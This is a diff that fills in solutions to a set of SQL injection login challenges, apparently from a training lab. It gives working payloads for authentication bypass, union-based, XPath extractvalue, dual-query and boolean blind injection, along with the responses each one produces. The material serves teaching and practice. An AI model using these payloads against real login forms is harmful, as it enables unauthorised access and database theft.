@@ -1,19 +1,74 @@
 Solutions of Login Injections challenge:
+(Reference: http://www.securityidiots.com/Web-Pentest/SQL-Injection/dump-database-from-login-form-sql.html)
 
 Error Based Injection:
 #1.
-#2.
-#3.
-#4.
++ Find <special_characters> such that when we edit username field:
+<special_characters> or true -- -
+we get message "Your Security Code is: ..."
+(in this case: ' or true -- -)
++ Try union-based injection:
+Enter username field: ' union select 1 -- -
+get message: "Your Security Code is : 1"
+So, we can use union-based injection
+(see basicinjections.txt for more details)
+
+Similar to #2,#3,#4
+#2. " union select 1,2,3 -- -
+#3. ') union select 1,2 -- -
+#4. ") union select 1,2,3,4,5 -- -
 
 XPath & Dual Injection:
 #1.
-#2.
-#3.
-#4.
++ Find <special_characters> such that when we edit username field:
+<special_characters> or true -- -
+we get message "Hello You are welcome..."
+(in this case: ") or true -- -)
++ Try union-based injection:
+Edit username field: ") order by <number> -- - to find number of rows
+(in this case, number of rows is 5)
+Edit username field: ") union select 1,2,3,4,5 -- - get message: "Hello You are welcome..."
+So, we cannot use union-based injection
++ Try XPath injection:
+Edit username field: ") or extractvalue(0, concat(0,(select database()))) -- -
+get error: "XPATH syntax error: 'leettime_761wHole'"
+So, we can use XPath injection to get information in DB (see XPathinjections.txt for more details)
+
+Similar to #2,#3,#4
+#2. ') or extractvalue() -- -
+#3. ' or extractvalue() -- -
+#4. " or extractvalue() -- -
 
 Blind Injection:
 #1.
-#2.
-#3.
-#4.
++ Find <special_characters> such that when we edit username field:
+<special_characters> or true -- -
+we get message "Hello You are welcome..."
+(in this case: ') or true -- -)
++ Try union-based injection:
+Edit username field: ') union select ... -- -
+only get message: "Hello You are welcome..." or "The Username and password entered by you is incorrect"
+So, we cannot use union-based injection
++ Try XPath injection:
+Edit username field: ') or extractvalue(0, concat(0,(select database()))) -- -
+get message: "The Username and password entered by you is incorrect"
+So, we cannot use XPath injection
++ Try dual injection:
+Edit username field: ') or (select 1 from (select count(*), (concat((select database()), 0, floor(rand()*2)))a from information_schema.tables group by a) b)-- -
+(can refresh mutiple times)
+only get message: "The Username and password entered by you is incorrect"
+So, cannot use dual injection
++ From the beginning, we see only 2 different messages:
+"The Username and password entered by you is incorrect" ("false" message)
+and "Hello You are welcome..." ("true" message)
+So, we can try boolean-based blind injection
++ Check boolean-based blind injection
+Edit username field: ') or true -- - get "true" message
+Edit username field: ') or false -- - get "false" message
+So, we can use boolean-based blind injection to get information in DB (see blindluck.txt for more details)
+Example: Edit: ') or (select count((select table_name from information_schema.tables where table_schema=database() limit 2,1))) -- -
+
+Similar to #2,#3,#4 
+#2. " or <SQL query> -- -
+#3. ") or <SQL query> -- -
+#4. ' or <SQL query> -- -
